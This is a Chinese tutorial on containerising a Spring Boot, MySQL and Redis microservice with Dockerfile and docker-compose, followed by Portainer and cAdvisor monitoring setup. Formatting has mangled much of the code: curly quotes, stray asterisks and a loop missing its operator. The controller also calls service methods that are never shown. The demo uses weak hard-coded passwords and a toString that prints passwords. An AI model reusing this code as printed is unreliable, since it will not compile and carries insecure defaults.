<p><em>/</em>*<br> ** <em>@auther</em> *zzyy<br> ** <em>@create</em> *2021-10-27 17:19<br> */</p>
<p><em>@Configuration<br>@Slf4j<br>public class RedisConfig<br>{<br><em>/</em></em><br>   ** <em>@param</em> *lettuceConnectionFactory<br>**** *@return</p>
<hr>
<p>   * redis序列化的工具配置类，下面这个请一定开启配置<br>* 127.0.0.1:6379&gt; keys *<br>   * 1) “ord:102” 序列化过<br>* 2) “\xac\xed\x00\x05t\x00\aord:102”  野生，没有序列化过<br>*/<br>*@Bean<br>public RedisTemplate redisTemplate(LettuceConnectionFactory lettuceConnectionFactory)<br>  {<br>    RedisTemplate redisTemplate = new RedisTemplate();</p>
<p>​    redisTemplate.setConnectionFactory(lettuceConnectionFactory);<br>*//设置key序列化方式string<br>*redisTemplate.setKeySerializer(new StringRedisSerializer());<br>*//设置value的序列化方式json<br>*redisTemplate.setValueSerializer(new GenericJackson2JsonRedisSerializer());</p>
<p>​    redisTemplate.setHashKeySerializer(new StringRedisSerializer());<br>​    redisTemplate.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());</p>
<p>​    redisTemplate.afterPropertiesSet();</p>
<p>return redisTemplate;<br>  }</p>
<p>}</p>
<hr>
<ul>
<li>SwaggerConfig</li>
</ul>
<hr>
<p>package com.atguigu.docker.config;</p>
<p>import org.springframework.beans.factory.annotation.Value;<br>import org.springframework.context.annotation.Bean;<br>import org.springframework.context.annotation.Configuration;<br>import springfox.documentation.builders.ApiInfoBuilder;<br>import springfox.documentation.builders.PathSelectors;<br>import springfox.documentation.builders.RequestHandlerSelectors;<br>import springfox.documentation.service.ApiInfo;<br>import springfox.documentation.spi.DocumentationType;<br>import springfox.documentation.spring.web.plugins.Docket;<br>import springfox.documentation.swagger2.annotations.EnableSwagger2;</p>
<p>import java.text.SimpleDateFormat;<br>import java.util.Date;</p>
<p><em>/</em>*<br> ** <em>@auther</em> *zzyy<br> ** <em>@create</em> *2021-05-01 16:18<br> */<br>*@Configuration<br>@EnableSwagger2<br>public class SwaggerConfig<br>{<br>@Value(“${spring.swagger2.enabled}”)<br>private Boolean enabled;</p>
<p>@Bean<br>public Docket createRestApi() {<br>return new Docket(DocumentationType.<em>SWAGGER_2</em>)<br>        .apiInfo(apiInfo())<br>        .enable(enabled)<br>        .select()<br>        .apis(RequestHandlerSelectors.<em>basePackage</em>(“com.atguigu.docker”)) *//你自己的package<br>*.paths(PathSelectors.<em>any</em>())<br>        .build();<br>  }</p>
<p>public ApiInfo apiInfo() {<br>return new ApiInfoBuilder()<br>        .title(“尚硅谷Java大厂技术”+”\t”+new SimpleDateFormat(“yyyy-MM-dd”).format(new Date()))<br>        .description(“docker-compose”)<br>        .version(“1.0”)<br>        .termsOfServiceUrl(“<a target="_blank" rel="noopener" href="https://www.atguigu.com/&quot;">https://www.atguigu.com/&quot;</a>)<br>        .build();<br>  }<br>}</p>
<hr>
<p>（2）新建entity</p>
<ul>
<li>User</li>
</ul>
<hr>
<p>package com.atguigu.docker.entities;</p>
<p>import javax.persistence.Column;<br>import javax.persistence.GeneratedValue;<br>import javax.persistence.Id;<br>import javax.persistence.Table;<br>import java.util.Date;</p>
<p>@Table(name = “t_user”)<br>public class User<br>{<br>@Id<br>  @GeneratedValue(generator = “JDBC”)<br>private Integer id;</p>
<p><em>/</em>*<br>   * 用户名<br>*/<br>*private String username;</p>
<p><em>/</em>*<br>   * 密码<br>*/<br>*private String password;</p>
<p><em>/</em>*<br>   * 性别 0=女 1=男<br>*/<br>*private Byte sex;</p>
<p><em>/</em>*<br>   * 删除标志，默认0不删除，1删除<br>*/<br>*private Byte deleted;</p>
<p><em>/</em>*<br>   * 更新时间<br>*/<br>*@Column(name = “update_time”)<br>private Date updateTime;</p>
<p><em>/</em>*<br>   * 创建时间<br>*/<br>*@Column(name = “create_time”)<br>private Date createTime;</p>
<p><em>/</em>*<br>   ** <em>@return</em> *id<br>   */<br>*public Integer getId() {<br>return id;<br>  }</p>
<p><em>/</em>*<br>   ** <em>@param</em> *id<br>***/<br>*public void setId(Integer id) {<br>this.id = id;<br>  }</p>
<p><em>/</em>*<br>   * 获取用户名<br>*<br>   ** <em>@return</em> *username - 用户名<br>*/<br>*public String getUsername() {<br>return username;<br>  }</p>
<p><em>/</em>*<br>   * 设置用户名<br>*<br>   ** <em>@param</em> <em>username</em> *用户名<br>*/<br>*public void setUsername(String username) {<br>this.username = username;<br>  }</p>
<p><em>/</em>*<br>   * 获取密码<br>*<br>   ** <em>@return</em> *password - 密码<br>*/<br>*public String getPassword() {<br>return password;<br>  }</p>
<p><em>/</em>*<br>   * 设置密码<br>*<br>   ** <em>@param</em> <em>password</em> *密码<br>*/<br>*public void setPassword(String password) {<br>this.password = password;<br>  }</p>
<p><em>/</em>*<br>   * 获取性别 0=女 1=男<br>*<br>   ** <em>@return</em> *sex - 性别 0=女 1=男<br>*/<br>*public Byte getSex() {<br>return sex;<br>  }</p>
<p><em>/</em>*<br>   * 设置性别 0=女 1=男<br>*<br>   ** <em>@param</em> <em>sex</em> *性别 0=女 1=男<br>*/<br>*public void setSex(Byte sex) {<br>this.sex = sex;<br>  }</p>
<p><em>/</em>*<br>   * 获取删除标志，默认0不删除，1删除<br>*<br>   ** <em>@return</em> *deleted - 删除标志，默认0不删除，1删除<br>*/<br>*public Byte getDeleted() {<br>return deleted;<br>  }</p>
<p><em>/</em>*<br>   * 设置删除标志，默认0不删除，1删除<br>*<br>   ** <em>@param</em> <em>deleted</em> *删除标志，默认0不删除，1删除<br>*/<br>*public void setDeleted(Byte deleted) {<br>this.deleted = deleted;<br>  }</p>
<p><em>/</em>*<br>   * 获取更新时间<br>*<br>   ** <em>@return</em> *update_time - 更新时间<br>*/<br>*public Date getUpdateTime() {<br>return updateTime;<br>  }</p>
<p><em>/</em>*<br>   * 设置更新时间<br>*<br>   ** <em>@param</em> <em>updateTime</em> *更新时间<br>*/<br>*public void setUpdateTime(Date updateTime) {<br>this.updateTime = updateTime;<br>  }</p>
<p><em>/</em>*<br>   * 获取创建时间<br>*<br>   ** <em>@return</em> *create_time - 创建时间<br>*/<br>*public Date getCreateTime() {<br>return createTime;<br>  }</p>
<p><em>/</em>*<br>   * 设置创建时间<br>*<br>   ** <em>@param</em> <em>createTime</em> *创建时间<br>*/<br>*public void setCreateTime(Date createTime) {<br>this.createTime = createTime;<br>  }<br>}</p>
<hr>
<ul>
<li>UserDTO</li>
</ul>
<hr>
<p>package com.atguigu.docker.entities;</p>
<p>import io.swagger.annotations.ApiModel;<br>import io.swagger.annotations.ApiModelProperty;<br>import lombok.AllArgsConstructor;<br>import lombok.Data;<br>import lombok.NoArgsConstructor;</p>
<p>import java.io.Serializable;<br>import java.util.Date;</p>
<p>@NoArgsConstructor<br>@AllArgsConstructor<br>@Data<br>@ApiModel(value = “用户信息”)<br>public class UserDTO implements Serializable<br>{<br>@ApiModelProperty(value = “用户ID”)<br>private Integer id;</p>
<p>@ApiModelProperty(value = “用户名”)<br>private String username;</p>
<p>@ApiModelProperty(value = “密码”)<br>private String password;</p>
<p>@ApiModelProperty(value = “性别 0=女 1=男 “)<br>private Byte sex;</p>
<p>@ApiModelProperty(value = “删除标志，默认0不删除，1删除”)<br>private Byte deleted;</p>
<p>@ApiModelProperty(value = “更新时间”)<br>private Date updateTime;</p>
<p>@ApiModelProperty(value = “创建时间”)<br>private Date createTime;</p>
<p><em>/</em>*<br>   ** <em>@return</em> *id<br>   */<br>*public Integer getId() {<br>return id;<br>  }</p>
<p><em>/</em>*<br>   ** <em>@param</em> *id<br>***/<br>*public void setId(Integer id) {<br>this.id = id;<br>  }</p>
<p><em>/</em>*<br>   * 获取用户名<br>*<br>   ** <em>@return</em> *username - 用户名<br>*/<br>*public String getUsername() {<br>return username;<br>  }</p>
<p><em>/</em>*<br>   * 设置用户名<br>*<br>   ** <em>@param</em> <em>username</em> *用户名<br>*/<br>*public void setUsername(String username) {<br>this.username = username;<br>  }</p>
<p><em>/</em>*<br>   * 获取密码<br>*<br>   ** <em>@return</em> *password - 密码<br>*/<br>*public String getPassword() {<br>return password;<br>  }</p>
<p><em>/</em>*<br>   * 设置密码<br>*<br>   ** <em>@param</em> <em>password</em> *密码<br>*/<br>*public void setPassword(String password) {<br>this.password = password;<br>  }</p>
<p><em>/</em>*<br>   * 获取性别 0=女 1=男<br>*<br>   ** <em>@return</em> *sex - 性别 0=女 1=男<br>*/<br>*public Byte getSex() {<br>return sex;<br>  }</p>
<p><em>/</em>*<br>   * 设置性别 0=女 1=男<br>*<br>   ** <em>@param</em> <em>sex</em> *性别 0=女 1=男<br>*/<br>*public void setSex(Byte sex) {<br>this.sex = sex;<br>  }</p>
<p><em>/</em>*<br>   * 获取删除标志，默认0不删除，1删除<br>*<br>   ** <em>@return</em> *deleted - 删除标志，默认0不删除，1删除<br>*/<br>*public Byte getDeleted() {<br>return deleted;<br>  }</p>
<p><em>/</em>*<br>   * 设置删除标志，默认0不删除，1删除<br>*<br>   ** <em>@param</em> <em>deleted</em> *删除标志，默认0不删除，1删除<br>*/<br>*public void setDeleted(Byte deleted) {<br>this.deleted = deleted;<br>  }</p>
<p><em>/</em>*<br>   * 获取更新时间<br>*<br>   ** <em>@return</em> *update_time - 更新时间<br>*/<br>*public Date getUpdateTime() {<br>return updateTime;<br>  }</p>
<p><em>/</em>*<br>   * 设置更新时间<br>*<br>   ** <em>@param</em> <em>updateTime</em> *更新时间<br>*/<br>*public void setUpdateTime(Date updateTime) {<br>this.updateTime = updateTime;<br>  }</p>
<p><em>/</em>*<br>   * 获取创建时间<br>*<br>   ** <em>@return</em> *create_time - 创建时间<br>*/<br>*public Date getCreateTime() {<br>return createTime;<br>  }</p>
<p><em>/</em>*<br>   * 设置创建时间<br>*<br>   ** <em>@param</em> <em>createTime</em> *创建时间<br>*/<br>*public void setCreateTime(Date createTime) {<br>this.createTime = createTime;<br>  }</p>
<p>@Override<br>public String toString() {<br>return “User{“ +<br>“id=” + id +<br>“, username=’” + username + ‘&#39;‘ +<br>“, password=’” + password + ‘&#39;‘ +<br>“, sex=” + sex +<br>‘}’;<br>  }<br>}</p>
<hr>
<p>（3）新建mapper</p>
<ul>
<li>新建接口UserMapper </li>
</ul>
<p>package com.atguigu.docker.mapper;</p>
<p>import com.atguigu.docker.entities.User;<br>import tk.mybatis.mapper.common.Mapper;</p>
<p>public interface UserMapper extends Mapper {<br>}</p>
<ul>
<li>src\main\resources路径下新建mapper文件夹并新增UserMapper.xml</li>
</ul>
<p><img src="/2022/02/07/Docker/image-20220215225810476.png" alt="image-20220215225810476"></p>
<p>（4）新建service</p>
<hr>
<p>package com.atguigu.docker.service;</p>
<p>import com.atguigu.docker.entities.User;<br>import com.atguigu.docker.mapper.UserMapper;<br>import lombok.extern.slf4j.Slf4j;<br>import org.slf4j.Logger;<br>import org.slf4j.LoggerFactory;<br>import org.springframework.beans.factory.annotation.Autowired;<br>import org.springframework.data.redis.core.RedisTemplate;<br>import org.springframework.data.redis.core.ValueOperations;<br>import org.springframework.stereotype.Service;<br>import org.springframework.web.bind.annotation.PathVariable;</p>
<p>import javax.annotation.Resource;<br>import java.util.concurrent.TimeUnit;</p>
<p><em>/</em>*<br> ** <em>@auther</em> *zzyy<br> ** <em>@create</em> *2021-05-01 14:58<br> */<br>*@Service<br>@Slf4j<br>public class UserService {</p>
<p>public static final String <em>CACHE_KEY_USER</em> = “user:”;</p>
<p>@Resource<br>private UserMapper userMapper;<br>@Resource<br>private RedisTemplate redisTemplate;</p>
<p><em>/</em>*<br>   * addUser<br>   ** <em>@param</em> *user<br>***/<br>*public void addUser(User user)<br>  {<br>*//1 先插入mysql并成功<br>*int i = userMapper.insertSelective(user);</p>
<p>if(i &gt; 0)<br>    {<br>*//2 需要再次查询一下mysql将数据捞回来并ok<br>*user = userMapper.selectByPrimaryKey(user.getId());<br>*//3 将捞出来的user存进redis，完成新增功能的数据一致性。<br>*String key = <em>CACHE_KEY_USER</em>+user.getId();<br>redisTemplate.opsForValue().set(key,user);<br>    }<br>  }</p>
<p><em>/</em>*<br>   * findUserById<br>   ** <em>@param</em> *id<br>**** *@return<br>***/<br>*public User findUserById(Integer id)<br>  {<br>    User user = null;<br>    String key = <em>CACHE_KEY_USER</em>+id;</p>
<p>*//1 先从redis里面查询，如果有直接返回结果，如果没有再去查询mysql<br>*user = (User) redisTemplate.opsForValue().get(key);</p>
<p>if(user == null)<br>    {<br>*//2 redis里面无，继续查询mysql<br>*user = userMapper.selectByPrimaryKey(id);<br>if(user == null)<br>      {<br>*//3.1 redis+mysql 都无数据<br>//你具体细化，防止多次穿透，我们规定，记录下导致穿透的这个key回写redis<br>*return user;<br>      }else{<br>*//3.2 mysql有，需要将数据写回redis，保证下一次的缓存命中率<br>*redisTemplate.opsForValue().set(key,user);<br>      }<br>    }<br>return user;<br>  }<br>}</p>
<hr>
<p>（5）新建controller</p>
<hr>
<p>package com.atguigu.docker.controller;</p>
<p>import cn.hutool.core.util.IdUtil;<br>import cn.hutool.core.util.ReferenceUtil;<br>import com.atguigu.docker.entities.User;<br>import com.atguigu.docker.entities.UserDTO;<br>import com.atguigu.docker.service.UserService;<br>import io.swagger.annotations.Api;<br>import io.swagger.annotations.ApiOperation;<br>import io.swagger.models.auth.In;<br>import lombok.extern.slf4j.Slf4j;<br>import org.springframework.beans.BeanUtils;<br>import org.springframework.beans.factory.annotation.Autowired;<br>import org.springframework.web.bind.annotation.*;</p>
<p>import javax.annotation.Resource;<br>import java.util.Random;</p>
<p><em>/</em>*<br> ** <em>@auther</em> *zzyy<br> ** <em>@create</em> *2021-05-01 15:02<br> */<br>*@Api(description = “用户User接口”)<br>@RestController<br>@Slf4j<br>public class UserController<br>{<br>@Resource<br>private UserService userService;</p>
<p>@ApiOperation(“数据库新增3条记录”)<br>@RequestMapping(value = “/user/add”,method = RequestMethod.<em>POST</em>)<br>public void addUser()<br>  {<br>for (int i = 1; i 3; i++) {<br>      User user = new User();</p>
<p>​      user.setUsername(“zzyy”+i);<br>​      user.setPassword(IdUtil.<em>simpleUUID</em>().substring(0,6));<br>​      user.setSex((byte) new Random().nextInt(2));</p>
<p>userService.addUser(user);<br>    }<br>  }</p>
<p>@ApiOperation(“删除1条记录”)<br>@RequestMapping(value = “/user/delete/{id}”,method = RequestMethod.<em>POST</em>)<br>public void deleteUser(@PathVariable Integer id)<br>  {<br>userService.deleteUser(id);<br>  }</p>
<p>@ApiOperation(“修改1条记录”)<br>@RequestMapping(value = “/user/update”,method = RequestMethod.<em>POST</em>)<br>public void updateUser(@RequestBody UserDTO userDTO)<br>  {<br>    User user = new User();<br>    BeanUtils.<em>copyProperties</em>(userDTO,user);<br>userService.updateUser(user);<br>  }</p>
<p>@ApiOperation(“查询1条记录”)<br>@RequestMapping(value = “/user/find/{id}”,method = RequestMethod.<em>GET</em>)<br>public User findUserById(@PathVariable Integer id)<br>  {<br>return userService.findUserById2(id);<br>  }<br>}</p>
<hr>
<h4 id="8、mvn-package命令将微服务形成新的jar包，并上传到Linux服务器-mydocker目录下"><a href="#8、mvn-package命令将微服务形成新的jar包，并上传到Linux服务器-mydocker目录下" class="headerlink" title="8、mvn package命令将微服务形成新的jar包，并上传到Linux服务器/mydocker目录下"></a>8、mvn package命令将微服务形成新的jar包，并上传到Linux服务器/mydocker目录下</h4><h4 id="9、编写Dockerfile"><a href="#9、编写Dockerfile" class="headerlink" title="9、编写Dockerfile"></a>9、编写Dockerfile</h4><hr>
<p># 基础镜像使用java</p>
<p>FROM java:8</p>
<p># 作者</p>
<p>MAINTAINER zzyy</p>
<p># VOLUME 指定临时文件目录为/tmp，在主机/var/lib/docker目录下创建了一个临时文件并链接到容器的/tmp</p>
<p>VOLUME /tmp</p>
<p># 将jar包添加到容器中并更名为zzyy_docker.jar</p>
<p>ADD docker_boot-0.0.1-SNAPSHOT.jar zzyy_docker.jar</p>
<p># 运行jar包</p>
<p>RUN bash -c ‘touch /zzyy_docker.jar’</p>
<p>ENTRYPOINT [“java”,”-jar”,”/zzyy_docker.jar”]</p>
<p>#暴露6001端口作为微服务</p>
<p>EXPOSE 6001</p>
<hr>
<h4 id="10、构建镜像"><a href="#10、构建镜像" class="headerlink" title="10、构建镜像"></a>10、构建镜像</h4><p>docker build -t zzyy_docker:1.6 .</p>
<h3 id="7-2-不用Compose"><a href="#7-2-不用Compose" class="headerlink" title="7.2 不用Compose"></a>7.2 不用Compose</h3><p>1、单独的mysql容器实例</p>
<p>（1）新建mysql容器实例</p>
<p>docker run -p 3306:3306 –name mysql57 –privileged=true -v /zzyyuse/mysql/conf:/etc/mysql/conf.d -v /zzyyuse/mysql/logs:/logs -v /zzyyuse/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7</p>
<p>（2）进入mysql容器实例并新建库db2021+新建表t_user</p>
<p><img src="/2022/02/07/Docker/image-20220215230544737.png" alt="image-20220215230544737"></p>
<p>2、单独的redis容器实例</p>
<p>docker run -p 6379:6379 –name redis608 –privileged=true -v /app/redis/redis.conf:/etc/redis/redis.conf -v /app/redis/data:/data -d redis:6.0.8 redis-server /etc/redis/redis.conf</p>
<p>3、微服务工程</p>
<p>docker run -d -p 6001:6001 zzyy_docker:1.6</p>
<p>4、上面三个容器实例依次顺序启动成功</p>
<p><img src="/2022/02/07/Docker/2F82140E-D775-406D-968A-BD14259C1072.png" alt="img"></p>
<h3 id="7-3-swagger测试"><a href="#7-3-swagger测试" class="headerlink" title="7.3 swagger测试"></a>7.3 swagger测试</h3><p><a href="http://localhost:你的微服务端口/swagger-ui.html#/">http://localhost:你的微服务端口/swagger-ui.html#/</a></p>
<h3 id="7-4-上面成功了，有哪些问题"><a href="#7-4-上面成功了，有哪些问题" class="headerlink" title="7.4 上面成功了，有哪些问题"></a>7.4 上面成功了，有哪些问题</h3><p>1、先后顺序要求固定，先mysql+redis才能微服务访问成功</p>
<p>2、多个run命令……</p>
<p>3、容器间的启停或宕机，有可能导致IP地址对应的容器实例变化，映射出错，要么生产IP写死(可以但是不推荐)，要么通过服务调用</p>
<h3 id="7-5-使用Compose"><a href="#7-5-使用Compose" class="headerlink" title="7.5 使用Compose"></a>7.5 使用Compose</h3><h4 id="1、服务编排，一套带走，安排"><a href="#1、服务编排，一套带走，安排" class="headerlink" title="1、服务编排，一套带走，安排"></a>1、服务编排，一套带走，安排</h4><h4 id="2、编写docker-compose-yml文件"><a href="#2、编写docker-compose-yml文件" class="headerlink" title="2、编写docker-compose.yml文件"></a>2、编写docker-compose.yml文件</h4><p>version: “3”</p>
<p>services:</p>
<p> microService:</p>
<p>  image: zzyy_docker:1.6</p>
<p>  container_name: ms01</p>
<p>  ports:</p>
<p>   - “6001:6001”</p>
<p>  volumes:</p>
<p>   - /app/microService:/data</p>
<p>  networks: </p>
<p>   - atguigu_net </p>
<p>  depends_on: </p>
<p>   - redis</p>
<p>   - mysql</p>
<p> redis:</p>
<p>  image: redis:6.0.8</p>
<p>  ports:</p>
<p>   - “6379:6379”</p>
<p>  volumes:</p>
<p>   - /app/redis/redis.conf:/etc/redis/redis.conf</p>
<p>   - /app/redis/data:/data</p>
<p>  networks: </p>
<p>   - atguigu_net</p>
<p>  command: redis-server /etc/redis/redis.conf</p>
<p> mysql:</p>
<p>  image: mysql:5.7</p>
<p>  environment:</p>
<p>   MYSQL_ROOT_PASSWORD: ‘123456’</p>
<p>   MYSQL_ALLOW_EMPTY_PASSWORD: ‘no’</p>
<p>   MYSQL_DATABASE: ‘db2021’</p>
<p>   MYSQL_USER: ‘zzyy’</p>
<p>   MYSQL_PASSWORD: ‘zzyy123’</p>
<p>  ports:</p>
<p>​    - “3306:3306”</p>
<p>  volumes:</p>
<p>​    - /app/mysql/db:/var/lib/mysql</p>
<p>​    - /app/mysql/conf/my.cnf:/etc/my.cnf</p>
<p>​    - /app/mysql/init:/docker-entrypoint-initdb.d</p>
<p>  networks:</p>
<p>   - atguigu_net</p>
<p>  command: –default-authentication-plugin=mysql_native_password #解决外部无法访问</p>
<p>networks: </p>
<p>  atguigu_net: </p>
<h4 id="3、第二次修改微服务工程docker-boot"><a href="#3、第二次修改微服务工程docker-boot" class="headerlink" title="3、第二次修改微服务工程docker_boot"></a>3、第二次修改微服务工程docker_boot</h4><p>（1）写YML</p>
<p>server.port=6001</p>
<p>*# ========================alibaba.druid相关配置=====================<br>spring.datasource.type=com.alibaba.druid.pool.DruidDataSource<br>spring.datasource.driver-class-name=com.mysql.jdbc.Driver<br>#spring.datasource.url=jdbc:mysql://192.168.111.169:3306/db2021?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false<br>spring.datasource.url=jdbc:mysql://mysql:3306/db2021?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false<br>spring.datasource.username=root<br>spring.datasource.password=123456<br>spring.datasource.druid.test-while-idle=false</p>
<p>*# ========================redis相关配置=====================<br>spring.redis.database=0<br>#spring.redis.host=192.168.111.169<br>spring.redis.host=redis<br>spring.redis.port=6379<br>spring.redis.password=<br>spring.redis.lettuce.pool.max-active=8<br>spring.redis.lettuce.pool.max-wait=-1ms<br>spring.redis.lettuce.pool.max-idle=8<br>spring.redis.lettuce.pool.min-idle=0</p>
<p>*# ========================mybatis相关配置===================<br><em>mybatis.mapper-locations=classpath:mapper/</em>.xml<br>mybatis.type-aliases-package=com.atguigu.docker.entities</p>
<p>*# ========================swagger=====================<br>spring.swagger2.enabled=true</p>
<p>通过服务名访问，IP无关</p>
<p>（2）mvn package命令将微服务形成新的jar包，并上传到Linux服务器/mydocker目录下</p>
<p><img src="/2022/02/07/Docker/image-20220216153134603.png" alt="image-20220216153134603"></p>
<p>（3）编写Dockerfile</p>
<p># 基础镜像使用java</p>
<p>FROM java:8</p>
<p># 作者</p>
<p>MAINTAINER zzyy</p>
<p># VOLUME 指定临时文件目录为/tmp，在主机/var/lib/docker目录下创建了一个临时文件并链接到容器的/tmp</p>
<p>VOLUME /tmp</p>
<p># 将jar包添加到容器中并更名为zzyy_docker.jar</p>
<p>ADD docker_boot-0.0.1-SNAPSHOT.jar zzyy_docker.jar</p>
<p># 运行jar包</p>
<p>RUN bash -c ‘touch /zzyy_docker.jar’</p>
<p>ENTRYPOINT [“java”,”-jar”,”/zzyy_docker.jar”]</p>
<p>#暴露6001端口作为微服务</p>
<p>EXPOSE 6001</p>
<p>（4）构建镜像</p>
<p>docker build -t zzyy_docker:1.6 .</p>
<h4 id="4、执行-docker-compose-up或者执行-docker-compose-up-d"><a href="#4、执行-docker-compose-up或者执行-docker-compose-up-d" class="headerlink" title="4、执行 docker-compose up或者执行 docker-compose up -d"></a>4、执行 docker-compose up或者执行 docker-compose up -d</h4><p><img src="/2022/02/07/Docker/325458C0-39EA-4502-A578-2F02ACBE2236.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/A1683C3E-803B-4A39-99D4-0089D955D548.png" alt="img"></p>
<h4 id="5、进入mysql容器实例并新建库db2021-新建表t-user"><a href="#5、进入mysql容器实例并新建库db2021-新建表t-user" class="headerlink" title="5、进入mysql容器实例并新建库db2021+新建表t_user"></a>5、进入mysql容器实例并新建库db2021+新建表t_user</h4><p><img src="/2022/02/07/Docker/image-20220216143400622.png" alt="image-20220216143400622"></p>
<h4 id="6、测试通过"><a href="#6、测试通过" class="headerlink" title="6、测试通过"></a>6、测试通过</h4><h4 id="7、Compose常用命令"><a href="#7、Compose常用命令" class="headerlink" title="7、Compose常用命令"></a>7、Compose常用命令</h4><p><img src="/2022/02/07/Docker/image-20220216143545052.png" alt="image-20220216143545052"></p>
<h4 id="8、关停"><a href="#8、关停" class="headerlink" title="8、关停"></a>8、关停</h4><p><img src="/2022/02/07/Docker/029E8B80-9B86-45C6-92EC-CBAE98904370.png" alt="img"></p>
<h1 id="Docker轻量级可视化工具Portainer"><a href="#Docker轻量级可视化工具Portainer" class="headerlink" title="Docker轻量级可视化工具Portainer"></a>Docker轻量级可视化工具Portainer</h1><h2 id="一、是什么-2"><a href="#一、是什么-2" class="headerlink" title="一、是什么"></a>一、是什么</h2><p>Portainer 是一款轻量级的应用，它提供了图形化界面，用于方便地管理Docker环境，包括单机环境和集群环境。</p>
<h2 id="二、-安装"><a href="#二、-安装" class="headerlink" title="二、 安装"></a>二、 安装</h2><p>官网：<a target="_blank" rel="noopener" href="https://www.portainer.io/">https://www.portainer.io/</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.portainer.io/v/ce-2.9/start/install/server/docker/linux">https://docs.portainer.io/v/ce-2.9/start/install/server/docker/linux</a></p>
<p>步骤：</p>
<p>（1）docker命令安装</p>
<p>docker run -d -p 8000:8000 -p 9000:9000 –name portainer     –restart=always     -v /var/run/docker.sock:/var/run/docker.sock     -v portainer_data:/data     portainer/portainer</p>
<p><img src="/2022/02/07/Docker/98FEB15A-17A4-4F46-948D-8154B8A66E69.png" alt="img"></p>
<p>（2）第一次登录需创建admin，访问地址：xxx.xxx.xxx.xxx:9000</p>
<p>用户名，直接用默认admin          密码记得8位，随便你写</p>
<p><img src="/2022/02/07/Docker/A5396F23-9438-4033-95F7-F6F14690CEA7.png" alt="img"></p>
<p>（3）设置admin用户和密码后首次登陆</p>
<p><img src="/2022/02/07/Docker/1311EDE4-69B2-4E05-83AD-6DBD174A1737.png" alt="img"></p>
<p>（4）选择local选项卡后本地docker详细信息展示</p>
<p><img src="/2022/02/07/Docker/82DF4268-418C-4D6C-BA2F-4EAEC3ED3D3C.png" alt="img"></p>
<p>（5）上一步的图形展示，能想得起对应命令吗？</p>
<p><img src="/2022/02/07/Docker/image-20220216144105781.png" alt="image-20220216144105781"></p>
<p>先后顺序要求固定，先mysql+redis才能微服务访问成功</p>
<h2 id="三、登陆并演示介绍常用操作case"><a href="#三、登陆并演示介绍常用操作case" class="headerlink" title="三、登陆并演示介绍常用操作case"></a>三、登陆并演示介绍常用操作case</h2><h1 id="Docker容器监控之CAdvisor-InfluxDB-Granfana"><a href="#Docker容器监控之CAdvisor-InfluxDB-Granfana" class="headerlink" title="Docker容器监控之CAdvisor+InfluxDB+Granfana"></a>Docker容器监控之CAdvisor+InfluxDB+Granfana</h1><h2 id="一、原生命令"><a href="#一、原生命令" class="headerlink" title="一、原生命令"></a>一、原生命令</h2><h3 id="1-1-操作"><a href="#1-1-操作" class="headerlink" title="1.1 操作"></a>1.1 操作</h3><p><img src="/2022/02/07/Docker/CD767C7D-DB64-49DE-B8B4-C4EB57C26371.png" alt="img"></p>
<p>docker stats命令的结果</p>
<p><img src="/2022/02/07/Docker/BE611B19-D215-4960-A0E8-A21172507D6A.png" alt="img"></p>
<h3 id="1-2-问题"><a href="#1-2-问题" class="headerlink" title="1.2 问题"></a>1.2 问题</h3><p>通过docker stats命令可以很方便的看到当前宿主机上所有容器的CPU,内存以及网络流量等数据，一般小公司够用了。。。。</p>
<p>但是，docker stats统计结果只能是当前宿主机的全部容器，数据资料是实时的，没有地方存储、没有健康指标过线预警等功能</p>
<h2 id="二、是什么：容器监控3剑客"><a href="#二、是什么：容器监控3剑客" class="headerlink" title="二、是什么：容器监控3剑客"></a>二、是什么：容器监控3剑客</h2><h3 id="2-1-一句话"><a href="#2-1-一句话" class="headerlink" title="2.1 一句话"></a>2.1 一句话</h3><p><img src="/2022/02/07/Docker/7DBFA29B-75B5-47A8-9770-BC0059B220B0.png" alt="img"></p>
<p>CAdvisor监控收集+InfluxDB存储数据+Granfana展示图表</p>
<h3 id="2-2-CAdvisor"><a href="#2-2-CAdvisor" class="headerlink" title="2.2 CAdvisor"></a>2.2 CAdvisor</h3><p><img src="/2022/02/07/Docker/C6EC48B1-C109-4ECB-87C9-C055C33D582F.png" alt="img"></p>
<h3 id="2-3-InfluxDB"><a href="#2-3-InfluxDB" class="headerlink" title="2.3 InfluxDB"></a>2.3 InfluxDB</h3><p><img src="/2022/02/07/Docker/image-20220216144458068.png" alt="image-20220216144458068"></p>
<h3 id="2-4-Granfana"><a href="#2-4-Granfana" class="headerlink" title="2.4 Granfana"></a>2.4 Granfana</h3><p><img src="/2022/02/07/Docker/image-20220216144524693.png" alt="image-20220216144524693"></p>
<h3 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h3><p><img src="/2022/02/07/Docker/E0527817-7302-413C-836C-2264856C8CD4.png" alt="img"></p>
<h2 id="三、compose容器编排，一套带走"><a href="#三、compose容器编排，一套带走" class="headerlink" title="三、compose容器编排，一套带走"></a>三、compose容器编排，一套带走</h2><h3 id="3-1-新建目录"><a href="#3-1-新建目录" class="headerlink" title="3.1 新建目录"></a>3.1 新建目录</h3><p><img src="/2022/02/07/Docker/DB91D88F-C94E-4E57-8FBE-8DBD8B32B7AA.png" alt="img"></p>
<h3 id="3-2-新建3件套组合的docker-compose-yml"><a href="#3-2-新建3件套组合的docker-compose-yml" class="headerlink" title="3.2 新建3件套组合的docker-compose.yml"></a>3.2 新建3件套组合的docker-compose.yml</h3><p>version: ‘3.1’</p>
<p>volumes:</p>
<p> grafana_data: {}</p>
<p>services:</p>
<p> influxdb:</p>
<p> image: tutum/influxdb:0.9</p>
<p> restart: always</p>
<p> environment:</p>
<p>  - PRE_CREATE_DB=cadvisor</p>
<p> ports:</p>
<p>  - “8083:8083”</p>
<p>  - “8086:8086”</p>
<p> volumes:</p>
<p>  - ./data/influxdb:/data</p>
<p> cadvisor:</p>
<p> image: google/cadvisor</p>
<p> links:</p>
<p>  - influxdb:influxsrv</p>
<p> command: -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxsrv:8086</p>
<p> restart: always</p>
<p> ports:</p>
<p>  - “8080:8080”</p>
<p> volumes:</p>
<p>  - /:/rootfs:ro</p>
<p>  - /var/run:/var/run:rw</p>
